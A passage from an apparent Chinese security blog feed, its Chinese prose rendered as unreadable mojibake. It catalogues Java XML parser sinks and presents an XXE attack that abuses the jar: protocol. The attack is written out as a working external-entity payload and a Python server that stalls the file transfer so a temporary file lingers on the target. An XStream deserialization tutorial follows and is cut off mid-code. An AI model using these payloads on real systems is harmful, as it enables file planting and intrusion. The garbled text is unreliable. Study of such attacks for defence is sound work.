class="line">javax.xml.transform.sax.SAXSource</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory</span><br><span class="line">org.dom4j.io.SAXReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XpathExpression</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.apache.commons.digester3.Digester</span><br></pre></td></tr></table></figure><p>åˆ†åˆ«ä»‹ç»ä¸€ä¸‹æ ¸å¿ƒä»£ç </p><h3 id="DocumentBuilder"><a href="#DocumentBuilder" class="headerlink" title="DocumentBuilder"></a>DocumentBuilder</h3><p>æœ‰å›æ˜¾è¾“å‡º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">db</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line"><span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> db.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(xml));</span><br></pre></td></tr></table></figure><h3 id="SAXReader"><a href="#SAXReader" class="headerlink" title="SAXReader"></a>SAXReader</h3><p>æ— å›æ˜¾ï¼Œéœ€è¦dom4jä¾èµ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SAXReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXReader</span>();</span><br><span class="line">reader.read(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(body)));</span><br></pre></td></tr></table></figure><h3 id="SAXParserFactory"><a href="#SAXParserFactory" class="headerlink" title="SAXParserFactory"></a>SAXParserFactory</h3><p>æ— å›æ˜¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SAXParserFactory</span> <span class="variable">spf</span> <span class="operator">=</span> SAXParserFactory.newInstance();</span><br><span class="line"><span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span> spf.newSAXParser();</span><br><span class="line">parser.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(xml)), <span class="keyword">new</span> <span class="title class_">DefaultHandler</span>());  <span class="comment">// parse xml</span></span><br></pre></td></tr></table></figure><h3 id="XMLReaderFactory"><a href="#XMLReaderFactory" class="headerlink" title="XMLReaderFactory"></a>XMLReaderFactory</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">XMLReader</span> <span class="variable">xmlReader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line">xmlReader.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(xml)));  <span class="comment">// parse xml</span></span><br></pre></td></tr></table></figure><h3 id="Digester"><a href="#Digester" class="headerlink" title="Digester"></a>Digester</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Digester</span> <span class="variable">digester</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Digester</span>();</span><br><span class="line">digester.parse(<span class="keyword">new</span> <span class="title class_">StringReader</span>(xml));</span><br></pre></td></tr></table></figure><h3 id="XMLReader"><a href="#XMLReader" class="headerlink" title="XMLReader"></a>XMLReader</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SAXParserFactory</span> <span class="variable">spf</span> <span class="operator">=</span> SAXParserFactory.newInstance();</span><br><span class="line"><span class="type">SAXParser</span> <span class="variable">saxParser</span> <span class="operator">=</span> spf.newSAXParser();</span><br><span class="line"><span class="type">XMLReader</span> <span class="variable">xmlReader</span> <span class="operator">=</span> saxParser.getXMLReader();</span><br><span class="line">xmlReader.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(xml)));</span><br></pre></td></tr></table></figure><h3 id="jaræ–‡ä»¶ä¸Šä¼ "><a href="#jaræ–‡ä»¶ä¸Šä¼ " class="headerlink" title="jaræ–‡ä»¶ä¸Šä¼ "></a>jaræ–‡ä»¶ä¸Šä¼ </h3><p>javaä¸­é’ˆå¯¹XMLæœ‰ä¸€ç§ä¸“å±çš„æ”»å‡»æ–¹å¼</p><p>å› ä¸ºjavaä¸­å­˜åœ¨jaråè®®çš„åŸå› ï¼Œjaråè®®å¤„ç†æ–‡ä»¶çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li>ä¸‹è½½ jar&#x2F;zip æ–‡ä»¶åˆ°ä¸´æ—¶æ–‡ä»¶ä¸­</li><li>æå–å‡ºæˆ‘ä»¬æŒ‡å®šçš„æ–‡ä»¶</li><li>åˆ é™¤ä¸´æ—¶æ–‡ä»¶</li></ol><p>fileåè®®å¯ä»¥è¿›è¡Œåˆ—ç›®å½•ï¼Œè¿›è€Œæ‰¾åˆ°ä¸´æ—¶æ–‡ä»¶è·¯å¾„ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æŠ¥é”™ä¿¡æ¯</p><p>ä¸€ä¸ªDocumentBuilderè§£æXMLçš„caseï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> xml_test;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Attr;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Comment;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Element;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.NamedNodeMap;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Node;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.NodeList;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä½¿ç”¨é€’å½’è§£æç»™å®šçš„ä»»æ„ä¸€ä¸ªxmlæ–‡æ¡£å¹¶ä¸”å°†å…¶å†…å®¹è¾“å‡ºåˆ°å‘½ä»¤è¡Œä¸Š</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> zhanglong</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">xmlcase</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">        <span class="type">DocumentBuilder</span> <span class="variable">db</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">        <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> db.parse(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;student.xml&quot;</span>));</span><br><span class="line">        <span class="comment">//è·å¾—æ ¹å…ƒç´ ç»“ç‚¹</span></span><br><span class="line">        <span class="type">Element</span> <span class="variable">root</span> <span class="operator">=</span> doc.getDocumentElement();</span><br><span class="line">        parseElement(root);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">parseElement</span><span class="params">(Element element)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">tagName</span> <span class="operator">=</span> element.getNodeName();</span><br><span class="line">        <span class="type">NodeList</span> <span class="variable">children</span> <span class="operator">=</span> element.getChildNodes();</span><br><span class="line">        System.out.print(<span class="string">&quot;&lt;&quot;</span> + tagName);</span><br><span class="line">        <span class="comment">//elementå…ƒç´ çš„æ‰€æœ‰å±æ€§æ‰€æ„æˆçš„NamedNodeMapå¯¹è±¡ï¼Œéœ€è¦å¯¹å…¶è¿›è¡Œåˆ¤æ–­</span></span><br><span class="line">        <span class="type">NamedNodeMap</span> <span class="variable">map</span> <span class="operator">=</span> element.getAttributes();</span><br><span class="line">        <span class="comment">//å¦‚æœè¯¥å…ƒç´ å­˜åœ¨å±æ€§</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> != map)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; map.getLength(); i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//è·å¾—è¯¥å…ƒç´ çš„æ¯ä¸€ä¸ªå±æ€§</span></span><br><span class="line">                <span class="type">Attr</span> <span class="variable">attr</span> <span class="operator">=</span> (Attr)map.item(i);</span><br><span class="line">                <span class="type">String</span> <span class="variable">attrName</span> <span class="operator">=</span> attr.getName();</span><br><span class="line">                <span class="type">String</span> <span class="variable">attrValue</span> <span class="operator">=</span> attr.getValue();</span><br><span class="line">                System.out.print(<span class="string">&quot; &quot;</span> + attrName + <span class="string">&quot;=\&quot;&quot;</span> + attrValue + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; children.getLength(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> children.item(i);</span><br><span class="line">            <span class="comment">//è·å¾—ç»“ç‚¹çš„ç±»å‹</span></span><br><span class="line">            <span class="type">short</span> <span class="variable">nodeType</span> <span class="operator">=</span> node.getNodeType();</span><br><span class="line">            <span class="keyword">if</span>(nodeType == Node.ELEMENT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//æ˜¯å…ƒç´ ï¼Œç»§ç»­é€’å½’</span></span><br><span class="line">                parseElement((Element)node);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nodeType == Node.TEXT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//é€’å½’å‡ºå£</span></span><br><span class="line">                System.out.print(node.getNodeValue());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nodeType == Node.COMMENT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;&lt;!--&quot;</span>);</span><br><span class="line">                <span class="type">Comment</span> <span class="variable">comment</span> <span class="operator">=</span> (Comment)node;</span><br><span class="line">                <span class="comment">//æ³¨é‡Šå†…å®¹</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> comment.getData();</span><br><span class="line">                System.out.print(data);</span><br><span class="line">                System.out.print(<span class="string">&quot;--&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(<span class="string">&quot;&lt;/&quot;</span> + tagName + <span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ è½½çš„student.xmlï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY  remote SYSTEM &quot;jar:http://localhost:9999/jar.zip!/wm.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;convert&gt;&amp;remote;&lt;/convert&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœjar.zipä¸­ä¸å­˜åœ¨wm.phpï¼Œå°±ä¼šæŠ¥é”™å¹¶è¾“å‡ºå¯»æ‰¾çš„è·¯å¾„</p><p>è¯·æ±‚çš„æ¶æ„9999æœåŠ¡å™¨å¦‚ä¸‹ï¼Œè¿è¡Œè„šæœ¬æ—¶ç¬¬ä¸€ä¸ªå‚æ•°å†™jar_fileè·¯å¾„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> threading </span><br><span class="line"><span class="keyword">import</span> socketserver </span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote </span><br><span class="line"><span class="keyword">import</span> http.client <span class="keyword">as</span> httpc </span><br><span class="line"></span><br><span class="line">listen_host = <span class="string">&#x27;localhost&#x27;</span> </span><br><span class="line">listen_port = <span class="number">9999</span> </span><br><span class="line">jar_file = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JarRequestHandler</span>(socketserver.BaseRequestHandler):  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        http_req = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;New connection:&#x27;</span>,self.client_address)</span><br><span class="line">        <span class="keyword">while</span> <span class="string">b&#x27;\r\n\r\n&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> http_req:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                http_req += self.request.recv(<span class="number">4096</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Client req:\r\n&#x27;</span>,http_req.decode())</span><br><span class="line">                jf = <span class="built_in">open</span>(jar_file, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">                contents = jf.read()</span><br><span class="line">                headers = (<span class="string">&#x27;&#x27;&#x27;HTTP/1.0 200 OK\r\n&#x27;&#x27;&#x27;</span></span><br><span class="line">                <span class="string">&#x27;&#x27;&#x27;Content-Type: application/java-archive\r\n\r\n&#x27;&#x27;&#x27;</span>)</span><br><span class="line">                self.request.sendall(headers.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"></span><br><span class="line">                self.request.sendall(contents[:-<span class="number">1</span>])</span><br><span class="line">                time.sleep(<span class="number">30</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="number">30</span>)</span><br><span class="line">                self.request.sendall(contents[-<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;get error at:&quot;</span>+<span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) </span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;waiting for connection...&#x27;</span>) </span><br><span class="line">    server_thread = threading.Thread(target=jarserver.serve_forever) </span><br><span class="line">    server_thread.daemon = <span class="literal">True</span> </span><br><span class="line">    server_thread.start() </span><br><span class="line">    server_thread.join()</span><br></pre></td></tr></table></figure><p>ä¸ºäº†è®©è¯¥æ–‡ä»¶é•¿æ—¶é—´åœç•™åœ¨ç³»ç»Ÿä¸­ï¼Œä½¿ç”¨sleepå»¶é•¿æ–‡ä»¶ä¼ è¾“æ—¶é—´ã€‚åˆå› ä¸ºéœ€è¦ä¿æŒæ–‡ä»¶çš„å®Œæ•´æ€§ï¼Œéœ€è¦ç”¨hexç¼–è¾‘å™¨åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ åƒåœ¾å­—ç¬¦ï¼Œå»¶é•¿æ•´ä¸ªä¼ è¾“æ—¶é—´</p><p>å‚è€ƒï¼š</p><p><a href="https://xz.aliyun.com/t/3357?time__1311=n4+xnii=G=0Q0=LH405DK3gcjDCb1DgnxYuwhrID#toc-21">https://xz.aliyun.com/t/3357?time__1311=n4%2Bxnii%3DG%3D0Q0%3DLH405DK3gcjDCb1DgnxYuwhrID#toc-21</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> otheræ¼æ´ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XStreamååºåˆ—åŒ–åˆé›†(Until 1.4.17)</title>
      <link href="/2024/10/31/xstream/"/>
      <url>/2024/10/31/xstream/</url>
      
        <content type="html"><![CDATA[<p>XStreamæ˜¯ä¸€ä¸ªèƒ½å°†Javaå¯¹è±¡å’ŒXMLç›¸äº’è½¬æ¢çš„Javaåº“ã€‚ï¼ˆè„‘æµ·æµ®ç°spring åŠ è½½xml</p><p>pom.xmlï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="toXMLåºåˆ—åŒ–"><a href="#toXMLåºåˆ—åŒ–" class="headerlink" title="toXMLåºåˆ—åŒ–"></a>toXMLåºåˆ—åŒ–</h3><p>XStreamåœ¨åºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œå¯¹ æ²¡æœ‰å®ç°Serializableçš„ç±» å’Œ å®ç°äº†Serializableçš„ç±»å¹¶é‡å†™äº†readObjectæ–¹æ³•çš„ç±» çš„å¤„ç†ä¸åŒã€‚é€šå¸¸æˆ‘ä»¬éƒ½è®¤ä¸ºè¿™ä¸ªä¸åŒåªä¼šå‘ç”Ÿåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­</p><p>å‡å¦‚æœ‰Personç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ç±»ï¼Œä½¿ç”¨xStream.toXMLåºåˆ—åŒ–å¯¹è±¡ä¸ºXMLæ ¼å¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XstreamTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;lucy&quot;</span>, <span class="number">22</span>);</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xStream.toXML(person);</span><br><span class="line">        System.out.print(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;yourpackage.Person&gt;</span><br><span class="line">  &lt;name&gt;lucy&lt;/name&gt;</span><br><span class="line">  &lt;age&gt;<span class="number">22</span>&lt;/age&gt;</span><br><span class="line">&lt;/yourpackage.Person&gt;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029163916052.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029163916052.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241029163916052"></p><p>å¦‚æœPersonå®ç°äº†Serializableæ¥å£å¹¶é‡å†™äº†readObjectï¼Œé‚£ä¹ˆç›¸åŒçš„åºåˆ—åŒ–å¤„ç†ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;yourpackage.Person serialization=<span class="string">&quot;custom&quot;</span>&gt;</span><br><span class="line">  &lt;yourpackage.Person&gt;</span><br><span class="line">    &lt;<span class="keyword">default</span>&gt;</span><br><span class="line">      &lt;name&gt;lucy&lt;/name&gt;</span><br><span class="line">      &lt;age&gt;<span class="number">22</span>&lt;/age&gt;</span><br><span class="line">    &lt;/<span class="keyword">default</span>&gt;</span><br><span class="line">  &lt;/yourpackage.Person&gt;</span><br><span class="line">&lt;/yourpackage.Person&gt;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029164547358.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029164547358.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241029164547358"></p><h3 id="fromXMLååºåˆ—åŒ–"><a href="#fromXMLååºåˆ—åŒ–" class="headerlink" title="fromXMLååºåˆ—åŒ–"></a>fromXMLååºåˆ—åŒ–</h3><p>ååºåˆ—åŒ–å°±ä¸ç”¨è¯´äº†ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fromXML</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;org.exploit.othercase.XStream.Person 